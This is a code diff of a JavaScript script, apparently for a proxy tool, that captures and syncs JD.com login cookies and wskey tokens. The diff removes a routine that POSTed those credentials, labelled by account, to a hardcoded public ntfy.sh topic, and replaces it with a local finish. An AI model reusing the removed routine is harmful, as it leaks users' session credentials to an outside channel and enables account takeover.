@@ -7,7 +7,6 @@
  */
 
 const RATE_LIMIT_MS = 60000;
-const NTFY_URL = "https://ntfy.sh/HzjHy2codes";
 
 // ============ BoxJs 同步：CookiesJD（任务脚本的多账号来源） ============
 function syncCookiesJD(pin, ckLine) {
@@ -114,40 +113,5 @@ if (!needPushCk && !needPushWs) {
   $done({});
 }
 
-// 有推送需求，用 $task.fetch 异步发，完成后 $done
-var pending = 0;
-function checkDone() {
-  pending--;
-  if (pending <= 0) $done({});
-}
-
-function pushNtfy(body, title) {
-  pending++;
-  var pushed = false;
-  try {
-    if (typeof $task !== "undefined" && $task.fetch) {
-      $task.fetch({
-        url: NTFY_URL,
-        method: "POST",
-        headers: { "Content-Type": "text/plain", Title: title },
-        body: body
-      }).then(function () {
-        console.log("[NTFY] 推送成功: " + title);
-        checkDone();
-      }, function (e) {
-        console.log("[NTFY] 推送失败: " + (e ? (e.error || JSON.stringify(e)) : "unknown"));
-        checkDone();
-      });
-      pushed = true;
-    }
-  } catch (e) {
-    console.log("[NTFY] fetch异常: " + e);
-  }
-  if (!pushed) {
-    console.log("[NTFY] $task.fetch 不可用，跳过推送");
-    checkDone();
-  }
-}
-
-if (needPushCk) pushNtfy(ckLine, "JD_cookie_" + pin);
-if (needPushWs) pushNtfy(wsLine, "JD_wskey_" + wp);
+// 有推送需求，本地通知即可
+$done({});
